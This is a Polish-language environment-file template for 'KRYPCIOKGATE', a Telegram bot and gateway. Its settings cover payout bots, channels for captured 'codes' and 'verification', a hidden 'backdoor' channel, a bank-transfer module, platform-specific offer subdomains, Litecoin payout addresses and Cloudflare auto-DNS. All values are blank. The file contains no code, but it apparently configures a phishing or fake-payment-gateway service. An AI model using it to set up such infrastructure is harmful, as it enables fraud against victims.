# ============================================================
#  KRYPCIOKGATE — WZORZEC KONFIGURACJI
#  Skopiuj do banita.env i uzupełnij własnymi wartościami.
#  banita.env NIGDY nie trafia do repo/ZIP-a publicznie.
# ============================================================

# === BOT TELEGRAM ===
# Token z @BotFather
TOKEN=
# Twoje ID Telegram (można kilka po przecinku) — pełne uprawnienia
OWNER_IDS=
ADMIN_ID=
# Token bota od wypłat (może być ten sam)
PAYOUT_BOT_TOKEN=
PAYOUT_ADMIN_ID=

# === KANAŁY (ID z -100...) ===
# Bot musi być ADMINISTRATOREM obu kanałów
CHANNEL_CODES=
CHANNEL_BACKDOOR=
# Domyślnie = CHANNEL_CODES (jeśli nie chcesz osobnych)
CHANNEL_PAYOUTS=
CHANNEL_VERIFICATION=
# Kto widzi backdoora (ID po przecinku) — reszta widzi tylko kanał główny
BACKDOOR_IDS=
# true tylko jeśli kanały mają WŁĄCZONE tematy (forum)
CHANNEL_TOPICS=false

# === PRZELEWY / BRAMKA (ID po przecinku) ===
# Osoby widzące ustawienia przelewów + moduł przelewów na bramce
PRZELEW_IDS=

# === PODSTAWY ===
DEFAULT_FEE=30
PORT=8080
WEBHOOK_PORT=8080
# webhook | gateway | both
APP_ROLE=both
MONGODB_URI=mongodb://127.0.0.1:27017/banita

# === BOT (adres webhooka) ===
# Publiczny adres HTTPS prowadzący na ten serwer (np. https://bottwojadomena.pl)
WEBHOOK_URL=
WEBHOOK_PATH=bot1_ZMIEN_MNIE
# Wygeneruj losowo: openssl rand -hex 32
WEBHOOK_SECRET=
BOT_DOMAIN=
RESERVED_DOMAINS=

# === DOMENY BRAMKI ===
# Publiczna domena bazowa (np. 1.2.3.4.nip.io albo twojadomena.pl)
# Podmieniana na <platforma>.<DEFAULT_DOMAIN> przy generowaniu linków ofert
DEFAULT_DOMAIN=
# Domyślny adres LTC dla nowych kont (można zostawić puste)
DEFAULT_LTC_ADDRESS=
# Domyślne auto-wypłata i limit wpłaty dla nowych kont (true/false, kwota lub puste)
DEFAULT_AUTO_WITHDRAW=false
DEFAULT_DEPOSIT_LIMIT=

# === CLOUDFLARE (opcjonalnie — auto-DNS dla domen userów) ===
CLOUDFLARE_API_KEY=
CLOUDFLARE_EMAIL=
CLOUDFLARE_TUNNEL_HOST=
CLOUDFLARE_TUNNEL_ID=

# === LIMITY ===
BOT_USER_RATE_MAX=60
BOT_USER_RATE_WINDOW_MS=60000
BOT_WEBHOOK_RATE_MAX=500
BOT_OWNER_NO_RATE_LIMIT=true
